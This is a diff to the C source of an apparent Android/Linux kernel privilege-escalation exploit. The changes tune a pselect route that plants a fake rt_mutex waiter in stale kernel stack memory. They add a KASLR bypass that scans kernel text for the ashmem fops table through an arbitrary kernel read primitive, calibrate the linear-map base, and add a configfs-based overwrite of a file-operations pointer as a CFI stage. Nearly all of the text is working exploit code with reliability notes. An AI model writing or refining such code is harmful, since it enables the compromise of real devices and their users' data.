@@ -97,6 +97,7 @@ void do_pselect_fake_lock_route(void) {
   int calls = 0;
   int success = 0;
   int route_verified = 0;
+  int walk_touched = 0;
   for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
        route_attempt++) {
     if (route_attempt != 1) {
@@ -123,11 +124,16 @@ void do_pselect_fake_lock_route(void) {
       break;
     }
 
+    /* Use the fd-bitmap encoding validated by the slide route (round-6):
+     * waiter bytes 40-79 = res_out words 1-4 (task/lock/prio/deadline),
+     * res_in = all zero. The old prepare_pselect_fdsets() put lock in the
+     * ex bitmap, which lands at waiter+0x50 and leaves waiter->lock NULL,
+     * panicking rt_mutex_adjust_prio_chain in spin_trylock. */
     fd_set in;
     fd_set out;
     fd_set ex;
-    prepare_pselect_fdsets(&in, &out, &ex);
-    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
+    prepare_slide_select_fdsets(&in, &out, &ex);
+    open_slide_selected_fds(&in, &out, &ex, high_read);
 
     atomic_store(&consumer_calls, 0);
     atomic_store(&consumer_success, 0);
@@ -137,22 +143,55 @@ void do_pselect_fake_lock_route(void) {
     atomic_store(&punch_consume_go, route_attempt);
 
     struct timespec timeout = {
-      .tv_sec = PSELECT_TIMEOUT_SEC,
-      .tv_nsec = 0,
+      .tv_sec = 0,
+      .tv_nsec = 200000000,  /* same as the validated slide pselect */
     };
     struct timespec *timeoutp = &timeout;
 
     errno = 0;
     int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
     int saved_errno = errno;
+    /* CRITICAL: the fd-bitmap-shaped stale waiter still lives on this
+     * thread's kernel stack below SP. Any syscall (write/pr_info) before
+     * the consumer punch lands would clobber it, and clearing go now
+     * would make the consumer miss the window entirely. Hold go=1 and
+     * busy-wait (yield only) until the punch has completed, exactly like
+     * the validated slide route. */
+    /* The PI chain walk over the fake waiter/lock/task can legitimately
+     * take seconds in-kernel; measured runs show sched_setattr returning
+     * AFTER the waiter's old spin caps expired. Wait unboundedly for the
+     * punch to complete: the syscall provably returns, and bailing early
+     * both logs stale values and skips try_cfi_stage via route_signal. */
+    for (volatile long spin = 0; spin < 32000000000L; spin++) {
+      if (atomic_load(&consumer_calls) > 0) break;
+      __asm__ volatile("yield" ::: "memory");
+    }
+    for (volatile long spin2 = 0; spin2 < 64000000000L; spin2++) {
+      if (atomic_load(&consumer_calls) > 0 &&
+          atomic_load(&consumer_inflight) == 0) {
+        break;
+      }
+      __asm__ volatile("yield" ::: "memory");
+    }
     atomic_store(&punch_consume_go, 0);
     calls = atomic_load(&consumer_calls);
     success = atomic_load(&consumer_success);
-    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
-            route_attempt, ret, saved_errno, calls, success, delay_usec);
+    uint32_t leak = ks_leak_readback();
+    walk_touched = ks_leak_walk_touched;
+    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d "
+            "delay=%d last_sched_ret=%d last_sched_errno=%d "
+            "walk_touched=%d leak=%08x\n",
+            route_attempt, ret, saved_errno, calls, success, delay_usec,
+            atomic_load(&consumer_last_ret),
+            atomic_load(&consumer_last_errno), walk_touched, leak);
 
     int route_signal = calls > 0 && success > 0;
-    if (route_signal) {
+    if (route_signal && !walk_touched) {
+      cfi_last_step = 36;
+      cfi_last_errno = 0;
+      pr_error("pselect walk probe miss attempt=%d/%d; refusing cfi probe\n",
+               route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS);
+    } else if (route_signal) {
       if (try_cfi_stage()) {
         cfi_last_step = 0;
         route_verified = 1;
@@ -168,7 +207,8 @@ void do_pselect_fake_lock_route(void) {
     close(pipefd[0]);
     close(pipefd[1]);
 
-    if (route_verified || cfi_dirty_seen || !route_signal) {
+    if (route_verified || cfi_dirty_seen || !route_signal ||
+        (route_signal && !walk_touched)) {
       break;
     }
     pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
@@ -222,8 +262,44 @@ int refresh_fake_fops_text(int fd) {
   return 1;
 }
 
+static int scan_kaslr_base(int fd) {
+  /* Scan the kernel text region for the ashmem fops table.  The open
+   * pointer at kaslr_base + ASHMEM_FOPS_OFF + FOPS_OPEN_OFF must satisfy
+   * open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE) == kaslr_base, which is a
+   * strong self-consistency check (a random read won't produce it). */
+  const uintptr_t scan_step = 0x200000; /* 2MB (SWAPPER_BLOCK_SIZE) */
+  const uintptr_t scan_max = 0x200000000ULL; /* 8GB slide range */
+  for (uintptr_t base = KIMAGE_TEXT_BASE;
+       base < KIMAGE_TEXT_BASE + scan_max; base += scan_step) {
+    kaslr_base = base;
+    uintptr_t fops_addr = kaslr_base + ASHMEM_FOPS_OFF;
+    uint64_t open_ptr = kernel_read64(fd, fops_addr + FOPS_OPEN_OFF);
+    if (!is_kernel_ptr(open_ptr))
+      continue;
+    if (open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE) != base)
+      continue;
+    pr_info("kaslr scan hit base=%016llx slide=%016llx\n",
+            (unsigned long long)base,
+            (unsigned long long)(base - KIMAGE_TEXT_BASE));
+    return 1;
+  }
+  kaslr_base = 0;
+  return 0;
+}
+
 int leak_kernel_base(int fd) {
-  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
+  /* When slide didn't run (alioth pselect route is dead), kaslr_base is
+   * zero; scan the text region for the ashmem fops table instead. */
+  if (!kaslr_base) {
+    if (!scan_kaslr_base(fd)) {
+      kaslr_step = 20;
+      return 0;
+    }
+  }
+  /* The p0 phys|PAGE_OFFSET data alias is invalid when the vendor kernel
+   * randomizes the linear map; kaslr_base is already known here because
+   * slide_leak_kernel_base() (pselect route, VA-only) runs first. */
+  kaslr_fops_alias = kaslr_base + ASHMEM_FOPS_OFF;
   kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
   kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
   kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
@@ -262,6 +338,17 @@ int leak_kernel_base(int fd) {
   }
 
   kaslr_step = 0;
+  /* calibrate the real linear map base from memstart_addr:
+   * VA(phys) = phys - memstart_addr + PAGE_OFFSET  =>  base = PAGE_OFFSET - memstart */
+  uint64_t memstart = kernel_read64(fd, kaslr_base + MEMSTART_ADDR_OFF);
+  if (memstart) {
+    extern uintptr_t g_direct_map_base;
+    g_direct_map_base = (uintptr_t)((int64_t)P0_PAGE_OFFSET - (int64_t)memstart);
+    pr_success("direct map calibrated memstart=%016llx base=%016zx "
+               "(mm phys would be %016llx)\n",
+               (unsigned long long)memstart, g_direct_map_base,
+               (unsigned long long)(0xffffffcca4a2f800ULL - g_direct_map_base));
+  }
   return 1;
 }
 
@@ -346,6 +433,40 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
+  if (getenv("KS_W1_TEST")) {
+    uint64_t original_fops = canon_addr(ASHMEM_FOPS);
+    ssize_t restore = configfs_write_once(
+        fd, misc_fops, &original_fops, sizeof(original_fops));
+    cfi_restore_ret = restore;
+    uint64_t after = 0;
+    ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
+    fops_after = after;
+    uint64_t null_owner = 0;
+    ssize_t owner =
+      configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
+    cfi_owner_ret = owner;
+    SYSCHK(close(fd));
+
+    if (restore == (ssize_t)sizeof(original_fops) &&
+        ra == (ssize_t)sizeof(after) &&
+        after == original_fops &&
+        owner == (ssize_t)sizeof(null_owner)) {
+      cfi_last_step = 0;
+      cfi_last_errno = 0;
+      atomic_store(&cfi_stage_done, 1);
+      pr_success("KS_W1_TEST primitive ok write=%zd read=%zd restore=%zd "
+                 "after=%016llx owner=%zd\n", cfi_write_ret, cfi_read_ret,
+                 restore, (unsigned long long)after, owner);
+      return 1;
+    }
+    cfi_last_step = 35;
+    cfi_last_errno = errno;
+    pr_error("KS_W1_TEST restore failed restore=%zd read=%zd after=%016llx "
+             "owner=%zd errno=%d\n", restore, ra,
+             (unsigned long long)after, owner, errno);
+    return 0;
+  }
+
   uint64_t before = 0;
   ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
   fops_before = before;
@@ -355,17 +476,15 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
-  if (!restore_slide_boot_id(fd)) {
-    cfi_last_step = 10;
-    cfi_last_errno = errno;
-    goto fail;
-  }
-
   if (!leak_kernel_base(fd)) {
     cfi_last_step = 9;
     cfi_last_errno = errno;
     goto fail;
   }
+
+  /* boot_id restore is cosmetic; non-fatal (slide may not have run, or
+   * the sysctl address may be wrong in the no-slide path). */
+  restore_slide_boot_id(fd);
 
   int installed = 0;
   pipe_stage_attempts = 0;
